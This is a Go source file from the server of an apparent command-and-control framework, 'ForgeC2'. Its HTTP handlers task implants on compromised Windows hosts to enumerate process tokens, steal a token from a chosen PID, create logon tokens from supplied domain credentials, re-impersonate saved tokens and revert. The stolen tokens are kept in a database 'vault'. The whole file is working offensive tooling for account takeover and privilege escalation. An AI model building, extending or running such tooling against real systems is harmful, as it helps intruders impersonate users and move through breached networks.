package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// ─────────────────────────────────────────────────────────────
// Token page (per-agent Token Management Center)
// ─────────────────────────────────────────────────────────────

func (s *Server) handleTokenPage(c *gin.Context) {
	id := c.Param("id")

	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	// load stored tokens for this agent
	var tokens []db.TokenEntry
	s.db.Where("agent_id = ?", id).Order("created_at desc").Find(&tokens)

	// active token (most recent with Active=true)
	var activeToken *db.TokenEntry
	for i := range tokens {
		if tokens[i].Active {
			activeToken = &tokens[i]
			break
		}
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":       "ForgeC2 - Token Management - " + agent.Hostname,
		"Agent":       agent,
		"Tokens":      tokens,
		"ActiveToken": activeToken,
		"ActiveNav":   "agents",
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "token_content", data)
}

// handleGlobalTokensPage shows all tokens across all agents
func (s *Server) handleGlobalTokensPage(c *gin.Context) {
	var tokens []db.TokenEntry
	s.db.Order("created_at desc").Limit(500).Find(&tokens)

	// build agent map for display
	agentIDs := map[string]bool{}
	for _, t := range tokens {
		agentIDs[t.AgentID] = true
	}
	var agentsInView []db.Implant
	if len(agentIDs) > 0 {
		ids := make([]string, 0, len(agentIDs))
		for id := range agentIDs {
			ids = append(ids, id)
		}
		s.db.Where("id IN ?", ids).Find(&agentsInView)
	}
	agentMap := map[string]db.Implant{}
	for _, a := range agentsInView {
		agentMap[a.ID] = a
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":     "ForgeC2 - Token Collection",
		"Tokens":    tokens,
		"AgentMap":  agentMap,
		"ActiveNav": "tokens",
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "tokens_global_content", data)
}

// ─────────────────────────────────────────────────────────────
// Token Operations (API)
// ─────────────────────────────────────────────────────────────

// handleTokenListProcs dispatches token_list_procs task to agent
func (s *Server) handleTokenListProcs(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "token_list_procs", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("token_list_procs: failed to create task", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Token list procs requested", "agent", id)
	s.dispatchTask(c, task, "token_list_procs", "list process tokens")
}

// handleTokenSteal dispatches token_steal task (steal token from pid)
// POST /agents/:id/token/steal  body: pid=<pid>
func (s *Server) handleTokenSteal(c *gin.Context) {
	id := c.Param("id")
	pidStr := c.PostForm("pid")
	processName := c.PostForm("process_name") // optional, for display

	if pidStr == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "pid required"})
		return
	}
	if _, err := strconv.ParseUint(pidStr, 10, 32); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid pid"})
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "token_steal", pidStr, "", processName, "", 0, 0)
	if err != nil {
		slog.Error("token_steal: failed to create task", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Token steal requested", "agent", id, "pid", pidStr)
	s.LogAuditRecord(c, "token_steal", "agent", id, fmt.Sprintf("steal token from pid %s", pidStr), true, nil)
	s.broadcastTaskUpdate(id, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleTokenMake dispatches token_make (LogonUser)
// POST /agents/:id/token/make  body: user=DOMAIN\user  password=xxx  logon_type=interactive|network
func (s *Server) handleTokenMake(c *gin.Context) {
	id := c.Param("id")
	domUser := c.PostForm("user")
	password := c.PostForm("password")
	logonType := c.PostForm("logon_type")

	if domUser == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "user required (format: DOMAIN\\user or user@domain)"})
		return
	}
	if logonType == "" {
		logonType = "interactive"
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	// Command = user, Shell = password, Path = logon_type
	task, err := s.createTask(id, "token_make", domUser, password, logonType, "", 0, 0)
	if err != nil {
		slog.Error("token_make: failed to create task", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Token make requested", "agent", id, "user", domUser)
	s.LogAuditRecord(c, "token_make", "agent", id, fmt.Sprintf("make_token for %s (logon: %s)", domUser, logonType), true, nil)
	s.broadcastTaskUpdate(id, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleTokenRevert dispatches rev2self
// POST /agents/:id/token/revert
func (s *Server) handleTokenRevert(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "token_revert", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("token_revert: failed to create task", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	// mark all tokens for this agent as inactive in DB
	s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", id, true).Update("active", false)

	slog.Info("Token revert (rev2self) requested", "agent", id)
	s.LogAuditRecord(c, "token_revert", "agent", id, "rev2self", true, nil)
	s.broadcastTaskUpdate(id, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleTokenWhoami dispatches token_whoami
func (s *Server) handleTokenWhoami(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "token_whoami", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.dispatchTask(c, task, "token_whoami", "")
}

// handleTokenDrop deletes a stored token entry from the vault
// DELETE /agents/:id/token/:token_id
func (s *Server) handleTokenDrop(c *gin.Context) {
	id := c.Param("id")
	tokenIDStr := c.Param("token_id")

	tokenID, err := strconv.ParseUint(tokenIDStr, 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid token id"})
		return
	}

	result := s.db.Where("id = ? AND agent_id = ?", tokenID, id).Delete(&db.TokenEntry{})
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": result.Error.Error()})
		return
	}
	if result.RowsAffected == 0 {
		c.JSON(http.StatusNotFound, gin.H{"error": "token not found"})
		return
	}

	s.LogAuditRecord(c, "token_drop", "agent", id, fmt.Sprintf("dropped token entry %s", tokenIDStr), true, nil)
	c.JSON(http.StatusOK, gin.H{"success": true})
}

// handleTokenImpersonate re-activates a saved token (re-steal from same pid)
// POST /agents/:id/token/:token_id/impersonate
func (s *Server) handleTokenImpersonate(c *gin.Context) {
	id := c.Param("id")
	tokenIDStr := c.Param("token_id")

	tokenID, err := strconv.ParseUint(tokenIDStr, 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid token id"})
		return
	}

	var entry db.TokenEntry
	if err := s.db.First(&entry, tokenID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "token entry not found"})
		return
	}
	if entry.AgentID != id {
		c.JSON(http.StatusForbidden, gin.H{"error": "token does not belong to this agent"})
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	// Re-steal the same pid
	task, err := s.createTask(id, "token_steal", fmt.Sprintf("%d", entry.PID), "", entry.ProcessName, "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Token re-impersonate requested", "agent", id, "pid", entry.PID, "user", entry.Username)
	s.LogAuditRecord(c, "token_impersonate", "agent", id, fmt.Sprintf("re-impersonate %s\\%s (pid %d)", entry.Domain, entry.Username, entry.PID), true, nil)
	s.broadcastTaskUpdate(id, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleGetTokens returns JSON list of tokens for an agent (used by AJAX)
func (s *Server) handleGetTokens(c *gin.Context) {
	id := c.Param("id")
	var tokens []db.TokenEntry
	s.db.Where("agent_id = ?", id).Order("created_at desc").Find(&tokens)
	c.JSON(http.StatusOK, tokens)
}

// ─────────────────────────────────────────────────────────────
// processTokenResult is called from handlers_beacon.go when a
// token task result arrives from the agent.
// ─────────────────────────────────────────────────────────────

// processTokenResult parses token task results and persists them to the vault.
func (s *Server) processTokenResult(agentID string, taskType string, output string) {
	switch taskType {
	case "token_steal":
		// output: JSON {"domain":"X","username":"Y","integrity":"Z","pid":"NNN","whoami":"..."}
		var m map[string]string
		if err := json.Unmarshal([]byte(output), &m); err != nil {
			slog.Warn("processTokenResult: could not parse token_steal output", "err", err)
			return
		}
		pid64, _ := strconv.ParseUint(m["pid"], 10, 32)

		// Deactivate any previous active tokens for this agent
		s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false)

		entry := db.TokenEntry{
			AgentID:     agentID,
			PID:         uint32(pid64),
			Domain:      m["domain"],
			Username:    m["username"],
			Integrity:   m["integrity"],
			Source:      "steal",
			TokenType:   "Impersonation",
			Active:      true,
			CreatedAt:   time.Now(),
		}
		s.db.Create(&entry)
		slog.Info("Token stolen and saved", "agent", agentID, "user", m["domain"]+"\\"+m["username"])

	case "token_make":
		var m map[string]string
		if err := json.Unmarshal([]byte(output), &m); err != nil {
			slog.Warn("processTokenResult: could not parse token_make output", "err", err)
			return
		}

		s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false)

		entry := db.TokenEntry{
			AgentID:   agentID,
			PID:       0,
			Domain:    m["domain"],
			Username:  m["username"],
			Integrity: m["integrity"],
			LogonType: m["logon_type"],
			Source:    "make_token",
			TokenType: "Primary",
			Active:    true,
			CreatedAt: time.Now(),
		}
		s.db.Create(&entry)
		slog.Info("Token made and saved", "agent", agentID, "user", m["domain"]+"\\"+m["username"])

	case "token_revert", "rev2self":
		// mark all inactive
		s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false)
	}
}

// handleTokenNoteUpdate updates notes on a token entry
// POST /agents/:id/token/:token_id/note
func (s *Server) handleTokenNoteUpdate(c *gin.Context) {
	id := c.Param("id")
	tokenIDStr := c.Param("token_id")
	notes := c.PostForm("notes")

	tokenID, err := strconv.ParseUint(tokenIDStr, 10, 64)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid token id"})
		return
	}

	result := s.db.Model(&db.TokenEntry{}).Where("id = ? AND agent_id = ?", tokenID, id).Update("notes", notes)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": result.Error.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true})
}

// ─────────────────────────────────────────────────────────────
// tokenListProcsResult parses the base64-encoded JSON from
// a token_list_procs result and returns nicely formatted text.
// (Used by handleBeaconResult in handlers_beacon.go)
// ─────────────────────────────────────────────────────────────

// FormatTokenProcsResult decodes base64 and formats a token_list_procs result for display.
func FormatTokenProcsResult(b64 string) string {
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return b64
	}
	return FormatTokenProcsFromJSON(string(raw))
}

// FormatTokenProcsFromJSON formats an already-decoded JSON token_list_procs result.
func FormatTokenProcsFromJSON(jsonStr string) string {
	type procInfo struct {
		PID         uint32 `json:"PID"`
		ProcessName string `json:"ProcessName"`
		Domain      string `json:"Domain"`
		Username    string `json:"Username"`
		Integrity   string `json:"Integrity"`
		TokenType   string `json:"TokenType"`
		Error       string `json:"Error"`
	}
	var procs []procInfo
	if err := json.Unmarshal([]byte(jsonStr), &procs); err != nil {
		return jsonStr // return raw if not valid JSON
	}
	if len(procs) == 0 {
		return "(no processes with notable tokens found)"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-8s  %-22s  %-30s  %-10s\n", "PID", "Process", "User", "Integrity"))
	sb.WriteString(strings.Repeat("─", 80) + "\n")
	for _, p := range procs {
		user := p.Domain + "\\" + p.Username
		if p.Error != "" {
			user = "(" + p.Error + ")"
		}
		sb.WriteString(fmt.Sprintf("%-8d  %-22s  %-30s  %-10s\n",
			p.PID, p.ProcessName, user, p.Integrity))
	}
	return sb.String()
}
